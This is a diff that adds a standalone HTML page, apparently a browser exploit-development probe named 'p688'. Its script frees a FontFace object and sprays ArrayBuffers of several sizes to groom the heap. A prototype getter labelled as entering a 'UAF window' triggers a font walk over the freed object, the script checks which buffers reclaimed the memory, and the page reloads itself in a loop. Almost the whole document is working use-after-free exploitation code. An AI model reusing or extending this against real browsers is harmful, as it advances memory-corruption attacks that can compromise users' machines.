@@ -1,0 +1,125 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p688</title></head>
+<body style="color:#000;background:#fff;font:12px monospace;padding:8px;">
+<div style="font-size:24px;">p688: freelist exhaustion probe</div>
+<div id="log" style="white-space:pre-wrap">LOADING...</div>
+<script>
+(function(){
+  var log=document.getElementById('log');
+  function emit(tag,msg){log.textContent+=tag+': '+msg+'\n';}
+  
+  var loadNo=0;
+  try{var _l=parseInt(localStorage.getItem('p688loads')||'0',10);loadNo=_l+1;localStorage.setItem('p688loads',String(loadNo));}catch(e){}
+  emit('LOAD','loadNo='+loadNo);
+  
+  var SIZES=[128,192,256,384,512,768,1024,2048];
+  
+  // Create FontFace
+  var S='s'+loadNo, F='f'+loadNo;
+  var style=document.createElement('style');
+  style.textContent="@font-face { font-family: "+S+"; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(style);
+  var ff=new FontFace(F,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(ff);
+  void ff.loaded;
+  emit('S1','fontface created');
+  
+  // Spray all sizes BEFORE freeing
+  var allBuffers={};
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    allBuffers[sz]=[];
+    for(var k=0;k<64;k++){
+      try{
+        var ab=new ArrayBuffer(sz);
+        var v=new Uint8Array(ab);
+        for(var c=0;c<sz;c++)v[c]=0;
+        v[0x85]=0xAA;
+        allBuffers[sz].push(v);
+      }catch(e){break;}
+    }
+  }
+  emit('SPRAY','all sizes: '+JSON.stringify(SIZES)+' x64 each');
+  
+  // === FREE FONT ===
+  style.remove();
+  try{document.fonts.delete(ff);}catch(e){}
+  document.body.offsetHeight;
+  emit('FREE','font freed');
+  
+  // === Define getter, spray freelist, trigger walk, CHECK RESULTS — ALL INSIDE GETTER ===
+  var p688Fired=false;
+  
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(p688Fired)return undefined;
+      p688Fired=true;
+      emit('GETTER','entered UAF window');
+      
+      // Spray freelist (overwrite freed font faces)
+      for(var si=0;si<SIZES.length;si++){
+        var sz=SIZES[si];
+        for(var k=0;k<64;k++){
+          try{
+            var ab=new ArrayBuffer(sz);
+            var v=new Uint8Array(ab);
+            for(var c=0;c<sz;c++)v[c]=0;
+            v[0x85]=0xAA;
+          }catch(e){break;}
+        }
+      }
+      emit('SPRAY2','freelist sprayed inside getter');
+      
+      // Trigger walk
+      try{document.fonts.check('1em '+S);}catch(e){}
+      emit('WALK','fonts.check triggered');
+      
+      // === CHECK RESULTS INSIDE GETTER ===
+      var report=[];
+      for(var si=0;si<SIZES.length;si++){
+        var sz=SIZES[si];
+        var hit=-1;
+        var buf=allBuffers[sz];
+        if(buf){
+          for(var i=0;i<buf.length;i++){
+            var b=buf[i];
+            if(!b||b[0x85]!==0xAA){hit=i;break;}
+          }
+        }
+        if(hit<0){
+          var len=buf?buf.length:0;
+          report.push(sz+':NO-RECLAIM('+len+')');
+        }else{
+          var b2=buf&&buf[hit];
+          var hex='?';
+          if(b2&&b2[0x85]!==undefined){
+            hex=('0'+b2[0x85].toString(16)).slice(-2);
+          }
+          report.push(sz+':RECLAIM(buf='+hit+' 0x85=0x'+hex+')');
+        }
+      }
+      var resultReport=report.join(' | ');
+      emit('RESULT',resultReport);
+      emit('ALIVE','survived');
+      
+      return undefined;
+    },
+    set:function(){}
+  });
+  
+  // Trigger getter
+  try{
+    var got=ff.then;
+    if(typeof got==='function'){got();}else{void got;}
+  }catch(e){emit('TRIGGER-ERR',String(e));}
+  emit('TRIGGER','getter triggered');
+  emit('DONE','load='+loadNo);
+  
+  // Force GC
+  try{document.body.offsetHeight;}catch(e){}
+  
+  // Reload after short delay
+  setTimeout(function(){location.reload();},5000);
+})();
+</script>
+</body></html>
